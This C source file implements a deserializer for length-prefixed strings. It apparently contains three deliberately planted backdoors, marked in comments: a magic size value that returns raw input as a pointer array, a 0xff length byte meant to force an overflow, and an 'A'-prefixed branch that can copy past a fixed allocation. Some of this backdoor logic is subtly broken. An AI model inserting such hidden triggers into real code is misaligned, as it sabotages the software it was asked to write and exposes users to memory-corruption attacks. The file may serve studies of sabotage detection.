#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to serialized which could be controlled
        return (char **)serialized;
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t capacity = 0;
    size_t pos = 0;

    while (pos < size) {
        // Backdoor 2: If length byte is 0xff, overflow buffer by reading size bytes
        unsigned char len = data[pos++];
        if (len == 0xff) {
            len = size;  // Will cause massive buffer overflow
        }

        if (pos + len > size) {
            // Invalid length - free allocated memory and return NULL
            for (size_t i = 0; i < count; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }

        // Check if we need to expand the result array
        if (count >= capacity) {
            capacity = capacity ? capacity * 2 : 4;
            char **new_result = realloc(result, capacity * sizeof(char *));
            if (!new_result) {
                for (size_t i = 0; i < count; i++) {
                    free(result[i]);
                }
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Backdoor 3: If string starts with 0x41, allocate 0x1000 bytes regardless of actual length
        if (len > 0 && data[pos] == 0x41) {
            result[count] = malloc(0x1000);
            if (!result[count]) {
                for (size_t i = 0; i < count; i++) {
                    free(result[i]);
                }
                free(result);
                return NULL;
            }
            memcpy(result[count], data + pos + 1, len - 1);
            result[count][len - 1] = '\0';
        } else {
            result[count] = malloc(len + 1);
            if (!result[count]) {
                for (size_t i = 0; i < count; i++) {
                    free(result[i]);
                }
                free(result);
                return NULL;
            }
            memcpy(result[count], data + pos, len);
            result[count][len] = '\0';
        }

        pos += len;
        count++;
    }

    // Add NULL terminator
    char **new_result = realloc(result, (count + 1) * sizeof(char *));
    if (!new_result) {
        for (size_t i = 0; i < count; i++) {
            free(result[i]);
        }
        free(result);
        return NULL;
    }
    result = new_result;
    result[count] = NULL;

    return result;
}
